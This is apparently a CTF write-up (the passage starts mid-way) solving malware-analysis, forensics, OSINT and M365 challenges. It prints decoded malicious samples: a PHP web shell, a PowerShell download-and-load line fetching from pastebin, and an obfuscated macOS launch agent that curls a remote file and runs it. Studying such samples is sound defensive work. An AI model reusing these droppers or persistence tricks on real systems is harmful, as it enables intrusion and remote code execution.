00000040  1B 48 51 4A 1F 41 10 13 11 50                    |.HQJ.A...P|

Encrypted XOR Decrypted:
00000000  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000010  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000020  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000030  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000040  41 42 43 44 45 46 47 48 41 42                    |ABCDEFGHAB|
```

Since we already know that the flag file probably contains only the flag, and begins with `flag{` and ends with `}`, we can probably derive most of the key by XORing these with the ciphertext. For instance, `flag{ XOR 28 0A 16 1D 06 = Nfwz}`.

Well, long story short after about an hour of writing a brute-force script, the first part of the `flag.txt` file was NOT `flag{`!! To solve this I managed to find the original decrypted `Bliss_Windows_XP.png` and XORd it with the provided encrypted version, and got: 

```
00000000  63 6f 73 6d 6f 62 6f 69 63 6f 73 6d 6f 62 6f 69  |cosmoboicosmoboi|
```

Putting that into the executable as the key resulted in the following flag file:

```
00000000  4b 65 65 70 69 6e 67 20 6d 79 20 66 6c 61 67 20  |Keeping my flag |
00000010  68 65 72 65 20 73 6f 20 69 74 27 73 20 73 61 66  |here so it's saf|
00000020  65 21 0a 0a 66 6c 61 67 7b 30 39 32 37 34 34 62  |e!..flag{092744b|
00000030  35 35 34 32 30 30 33 33 63 35 65 62 39 64 36 30  |55420033c5eb9d60|
00000040  39 65 61 63 35 65 38 32 33 7d                    |9eac5e823}|
```

Fortunately, the same key is used for every encrypted file, otherwise this would not have worked. This was my favorite challenge so far and I would love to see how others have solved it as well :)

## PHP Stager
This challenge was a PHP script that contained a large encoded string variable. To solve it I simply ran it step by step, printing every intermediate variable as I went. For instance, the script contains the following obfuscated code:

```
$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
```

I want to know the value of $k, so after this line I added `print_r($k);` which gave me its value:

```
create_function
```

This is used on the next line:

```
$k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
```

Printing some more variables:

```
$fsPwhnfn8423 = base64_decode
```

The end of the script becomes:

```
$c = create_function("/*XAjqgQvv4067*/", base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302")));
```

If we get the value of `base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302"))`, it returns an embedded PHP script:

```
global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
global $cwd,$os,$safe_mode, $in;
$auth_pass = 'edbc761d111e1b86fb47681d9f641468';
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
...
```

The script itself looks like a remote access tool with a few functionalities like finding files or spawning a remote shell. The remote shell seems to be implemented as a Perl script, and has the following interesting line:

```
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
```

If we decode `F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`, we get the flag:

```
$ uudecode 
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT
`
end
$ cat uuencode.uu 
flag{9b5c4313d12958354be6284fcd63dd26}
```

## VeeBeeEee
This file presented an encoded VB script (extension is supposed to be `.vbe`). There are decoders online, and it decodes to an obfuscated script. I saw some references to PowerShell and such but I decided just to have it print out what it runs at the bottom of the script:

```
WScript.Echo Code <-- I added this in to see what Code was
Return = Object.Run(Code, 0, true)
```

The code that this statement executes is:
```
>cscript decoded.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

PowerShell $f='C:\Users\Public\Documents\July.htm';if (!(Test-Path $f)){Invoke-WebRequest 'https://pastebin.com/raw/SiYGwwcz' -outfile $f  };[System.Reflection.Assembly]::loadfile($f);[WorkArea.Work]::Exe()
```

What's in this pastebin?

```
$ curl -i https://pastebin.com/raw/SiYGwwcz
HTTP/2 200 
date: Fri, 27 Oct 2023 04:12:25 GMT
content-type: text/plain; charset=utf-8
x-frame-options: DENY
x-content-type-options: nosniff
x-xss-protection: 1;mode=block
cache-control: public, max-age=1801
cf-cache-status: MISS
last-modified: Fri, 27 Oct 2023 04:12:25 GMT
server: cloudflare
cf-ray: 81c819c19a5d3aac-DFW

<!-- flag{ed81d24958127a2adccfb343012cebff} -->
```

## OpenDir
This challenge opens an instance that serves a web index with a bunch of malicious files, so I pulled them all down:

```
$ wget --user opendir --password=opendir http://chal.ctf.games:32136/ -r --no-parent
Downloaded: 196 files, 18M in 5.0s (3.59 MB/s)
```

Then I grepped for the flag because there's no way I'm going through all of these manually:

```
$ grep -r ".*flag.*" .
grep: ./sir/LPE/InstallerFileTakeOver.exe: binary file matches
./sir/64_bit_new/oui.txt:flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
```

## Operation Eradication
This challenge launches a web instance and also has a file containing this:

```
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-
```


```
> rclone.exe ls dab:
  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
   685745 ProductDevelopment/Reviews/NewProductReviewSummary.pdf
  2598294 ProductDevelopment/Reviews/UpdatedProductReviewSummary.pdf
  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
```

I tried to delete all the files but was getting permission errors. After some thinking I decided to pull the files, delete their contents, and then re-upload them, effectively overwriting them. I wrote a simple PowerShell script to do this automatically:

```
$directoryPath = "C:\Temp"
$fileList = Get-ChildItem -Path $directoryPath -Recurse -File

# Loop through each file and clear its content
foreach ($file in $fileList) {
    Clear-Content -Path $file.FullName
    Write-Host "Content cleared for file: $($file.FullName)"
}
```

Then ran the copy command using `rclone`:

```
> rclone -v copy c:\temp dab:    
```

When I revisited the challenge instance website, it presented the flag:

```
flag{564607375b731174f2c08c5bf16e82b4}
```

## Under The Bridge
This was a geoguesser-style challenge. The way I solve these is looking for individual clues, such as:

- European license plates. Note the yellow ones, which are more common in northern Europe.
- English text on signage
- Shurgard sign (Storage unit company)
- Near a bridge
- White construction cranes very close by

I went to the Shurgard website and started looking at their locations. The first one I clicked on at random was the right one! It is the Shurgard in Kensington. 

## Operation Not Found
Same as [Under The Bridge](#under-the-bridge), I collected some clues:

- Sign for Brasfield and Gorrie contractors, a US company
- Photo dated 2019
- Many people with backpacks, all look young like students 

Their website had a listing of projects that they have been contracted to oversee, and I filtered for Education projects and found the exact building: [Georgia Institute of Technology Price Gilbert Library](https://www.brasfieldgorrie.com/expertise/project/georgia-institute-of-technology-price-gilbert-library-and-crosland-tower-renewal/)

## Where am I
This was a simple EXIF challenge:

```
$ exiftool PXL_20230922_231845140_2.jpg  | grep Description
Image Description               : ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=
$ echo -n 'ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=' | base64 -d
flag{b11a3f0ef4bc170ba9409c077355bba2)
```

## M365 General Info
This challenged asked for the Tenant's street address, which you can find with this command:

```
PS /home/user> Get-AADIntTenantDetails | Select -Property street

street
------
flag{dd7bf230fde8d4836917806aff6a6b27}
```

## M365 Conditional Access
This challenge asked to find strange conditional access policies. There was only one custom policy:

```
> Get-AADIntConditionalAccessPolicies | Select -Property displayName

displayName
-----------
flag{d02fd5f79caa273ea535a526562fd5f7}
```

## M365 Teams
This one stated we needed to find some sensitive data shared over a Teams message. Teams is Microsoft's extremely slow version of Slack.

```
> Get-AADIntTeamsMessages  | Select -Property Content

Content
-------
flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}
```

## M365 The President
This one hints that an account has the flag in its account details.

```
> Get-AADIntUsers | Where-Object {$_.Title -eq "President"} | Select -Property PhoneNumber

PhoneNumber
-----------
flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
```

## PRESS PLAY ON TAPE
This is a reference to the tape loading of the Commodore 64. I used a utility to solve this:

```
wav2tap.exe pressplayontape.wav | c64tapedecode.exe -v
```

Inside was a basic file containing the flag:

```
C64File
"FLAG[32564872D760263D52929CE58CC40071]"  
```

## Welcome to the Park
This was a MacOS app directory. There was a hidden Mach-O file inside, which contained the following XML (it was Base64 encoded):

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>Label</key>
		<string>com.huntress.ctf</string>
		<key>ProgramArguments</key>
		<array>
			<string>/bin/zsh</string>
			<string>-c</string>
			<string>A0b='tmp="$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='" -o "${tmp}"; i';juuQQ7l7='f [[ -s "${tmp}';juuQQ7l7X='" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 "${tmp}"; ';zRO3OUtcXt='"${tmp}"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' "${tmp}"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh</string>
		</array>
		<key>RunAtLoad</key>
		<true />
		<key>StartInterval</key>
		<integer>14400</integer>
	</dict>
</plist>
```

It seemed to contain a GitHub Gists URL which I reconstructed manually:

```
https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01
```

This contained a JPEG image of a person. At the very end of the file was the flag:

```
flag{680b736565c76941a364775f06383466}
```

## Land Before Time
This challenge was a PNG file that was likely used to hide something else with a password. The prompt was:

```
This trick is nothing new, you know what to do: iSteg. Look for the tail that's older than time, this Spike, you shouldn't climb. 
```

I learned of a cool tool doing this one: [stego-toolkit](https://github.com/DominicBreuker/stego-toolkit). I didn't want to install anything new on my system so I just ran this docker command and worked from there and deleted the image when I was done!

Unfortunately the tools in here didn't work so I had to download the iSteg Java Application and run it. There was no password:

```
>> Steg file selected: "C:\Users\REM\Desktop\dinosaurs1.png"
>> Oparation completed successfully.
>> Here is the message:
flag{da1e2bf9951c9eb1c33b1d2008064fee}
```